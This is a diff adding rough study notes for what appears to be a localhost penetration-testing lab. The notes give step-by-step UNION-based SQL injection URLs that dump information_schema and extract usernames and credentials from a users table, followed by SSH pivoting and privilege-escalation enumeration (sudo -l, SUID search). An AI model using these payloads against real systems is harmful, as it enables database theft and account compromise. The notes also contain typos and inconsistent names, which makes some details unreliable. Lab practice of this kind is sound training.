@@ -321,4 +321,70 @@ ex:
 
 **127.0.0.1:rhp/pick.php?product=7** : #7 is the vulnerable that shows all tables
 
-- (now go through 
+- (Building off of URL)
+
+Blind Injection (Identify Vulnerable Field)
+
+**http://127.0.0.1:10004/.php?Selection=1**  
+
+(note: product= is = to selection=)
+
+(you will just change the # after Selection=# to see what is vulnerable)
+
+- (Identify Number of Columns)
+
+**http://127.0.0.1:10004/uniondemo.php?Selection=2 UNION SELECT 1,2,3**
+
+(Reorder numbers to match ouput of query that it prompts)
+
+**http://127.0.0.1:10004/.php?Selection=2 UNION SELECT 1,3,2**
+
+- (Golden Statement) you will enter to get full database
+
+**http://127.0.0.1:10004/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns**
+
+(note: this dumps out entire database)
+
+- (Craft Queries based on database your given)
+
+**(note: you want only to query USER inputed fields which will only be at TOP or BOTTOM of table)**
+
+syntax:
+
+**http://127.0.0.1:10004/pick.php?product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns**
+
+- (now you will adjust syntax to query the table)
+
+(**from the table situeser is the database, id user_id name is the 1,2,3 parameters, and $users is the columns the database queries from**)
+
+ex:   **siteusers|   user_id   | $users**
+
+syntax to querie this:
+
+**http://127.0.0.1:10004/pick.php?product=7 UNION SELECT user_id,name,username FROM situsers.users**
+
+- (this will have prompted you creds)
+
+(note: notice that it gives you previous creds w/ a new one, and they are coded, so go to 1st website and decode them from decode page)
+
+# Exploit Box 3
+
+- (from ssh -S to ips ssh and http port, connect to ip:ssh port)
+(from new term)
+
+**ssh -MS /tmp/box3 user@127.0.0.1 -p rhp**
+
+- (now enumerate the box)
+(from box)
+
+**bash**
+
+**/etc/hosts**
+
+**sudo -l**
+
+- (run the linuxexploit cmd for SUID/SGUID)
+
+
+
+  
